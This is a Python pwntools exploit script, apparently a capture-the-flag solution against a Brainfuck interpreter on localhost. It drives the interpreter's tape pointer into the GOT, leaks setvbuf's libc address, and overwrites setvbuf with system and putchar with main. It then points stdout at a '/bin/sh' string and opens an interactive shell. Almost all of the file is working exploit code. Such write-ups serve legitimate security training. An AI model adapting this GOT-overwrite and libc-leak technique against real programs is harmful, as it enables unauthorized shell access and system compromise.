#!/usr/bin/env python3

from pwn import *

shellcode = b"\x90\x90\x90\x90\x90\xCC"
tape_location = 0x0804a0a0
p_location = 0x0804a080
setvbuff_location = 0x0804a028
libc_system_offset = 0x3ada0
libc_setvbuf_offset = 0x60360
plt_got_location = 0x0804a000
main_addr = 0x08048671
t2p_distance = tape_location - p_location
system_cmd = "/bin/sh"
print(f"Distance from p to tape: 0x{t2p_distance:02X}")

io = remote("localhost", 2020)

# Clear out any output, including the newline.
print(io.recvuntilS('[ ]\n'))

# 0. Read in /bin/sh into our tape
bf_str = ",>" * len(system_cmd)

# Rewind back to the beginning of the tape.
bf_str += "<" * len(system_cmd)

# Rewind p into itself from tape. 
bf_str += "<" * (tape_location - p_location)

# 1. Rewrite our pointer p to point to setvbuf in the plt.got (0x28)
bf_str += "," 

# Now we are at setvbuf Leak out the address of setvbuf.
bf_str += ".>" * 4

# Rewind to the beginning of setvbuf
bf_str += "<" * 4

# 2. Overwrite setvbuf with the address of system
bf_str += ",>,>,>,>"

# Skip over memset.
bf_str += ">" * 4

# 3. Overwrite putchar with the address of main.
bf_str += ",>,>,>,>"

# Skip to stdout inside our program
bf_str += ">" * 0x2C

# 4. Overwrite with the location of /bin/sh in our input string
bf_str += ",>,>,>,"

# Call putchar to kick it all off.
bf_str += "."

print(f"Sending... {bf_str}")

io.sendline(bf_str)

# 0. Read in /bin/sh into our tape.
io.send("/bin/sh")

# 1. P now points to itself, slam this value into the last byte to quickly jump
# to the location of setvbuf. We can now manipulate this function.
shellcode = p8(0x28)
io.send(shellcode)
u = make_unpacker(32, endian='little', sign='unsigned')

# Read 4 bytes in order to get the address of setvbuf.
libc_setvbuf_addr = u(io.recvn(4))
print(f"Libc setvbuf addr: {libc_setvbuf_addr:02x}")

# 2. Calculate and send the address of system, using the offset between setvbuf and system.
libc_system_addr = libc_setvbuf_addr - (libc_setvbuf_offset - libc_system_offset)
print(f"Location of system: {libc_system_addr:02x}")
io.send(p32(libc_system_addr))

# 3. Overwrite the value of putchar with the address of main.
io.send(p32(main_addr))

# 4. Overwrite with the location of /bin/sh.
io.send(p32(tape_location))

io.interactive()

